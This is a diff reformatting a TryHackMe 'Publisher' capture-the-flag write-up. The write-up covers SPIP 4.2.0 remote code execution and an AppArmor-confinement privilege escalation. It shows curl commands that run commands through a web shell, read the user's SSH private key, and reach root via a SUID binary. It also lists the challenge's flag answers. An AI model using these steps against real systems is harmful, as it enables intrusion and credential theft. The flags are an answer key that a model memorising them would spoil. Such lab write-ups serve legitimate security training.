@@ -1,8 +1,28 @@
-## Room Description
+# Publisher
+
+| Field | Value |
+| --- | --- |
+| Platform | TryHackMe |
+| Category | Web and Linux Privilege Escalation |
+| Difficulty | Medium |
+
+## Overview
+
+Assess the security of the content management system and host confinement.
+
+<details>
+<summary>Original challenge description</summary>
+
 The "**Publisher**" CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system's security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.
-## Solution
+
+</details>
+
+## Analysis
+
+The assessment identified remote code execution in SPIP and gaps in AppArmor confinement.
+
 ![screenshot_1](screenshots/ss_1.png)
-#### nmap
+### nmap
 ```
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
 | ssh-hostkey:    
@@ -14,13 +34,13 @@ The "**Publisher**" CTF machine is a simulated environment hosting some services
 |_http-title: Publisher's Pulse: SPIP Insights & Tips
 ```
 
-#### dirsearch
+### dirsearch
 ```
 /images/
 /spip/
 ```
 
-#### Exploiting
+### Exploiting
 Site has been published with **SPIP 4.2.0**
 On *exploit-db* i found this [exploit](https://www.exploit-db.com/exploits/51536)
 
@@ -57,14 +77,14 @@ curl "http://10.10.163.246/spip/rce.php?cmd=ls%20-la%20%2Fhome"
 curl "http://10.10.163.246/spip/rce.php?cmd=cat%20%2Fhome%2Fthink%2Fuser.txt"
 ```
 `fa229046d44eda6a3598c73ad96f4ca5`
-#### Stabilize shell (ssh)
+### Stabilize shell (ssh)
 Target machine has a private ssh, so we can connect via ssh with it
 ```bash
 curl "http://10.10.163.246/spip/rce.php?cmd=cat%20%2Fhome%2Fthink%2F.ssh%2Fid_rsa" > id_rsa
 chmod 400 id_rsa
 ssh -i id_rsa think@10.10.163.246
 ```
-#### root.txt Flag
+### root.txt Flag
 Use command `find / -perm -4000 2>/dev/null` to see what command we are able to run with user's permissions
 ```
 /tmp/default  
@@ -119,13 +139,15 @@ cd /tmp
 ./default -p
 cat /root/root.txt
 ```
-## Questions
+
+## Result
+
 ***Question #1.*** What is the user flag?
 *Answer*: **fa229046d44eda6a3598c73ad96f4ca5**
 **Question #2.** What is the root flag?
 *Answer:* **3a4225cc9e85709adda6ef55d6a4f2ca**
 
----
-### Resources
-- **Worldist** (*dirsearch*) - https://github.com/danielmiessler/SecLists
+## References
+
+- **Wordlist** (*dirsearch*) - https://github.com/danielmiessler/SecLists
 - **Exploit** (*SPIP v4.2.0 - RCE*) - https://www.exploit-db.com/exploits/51536
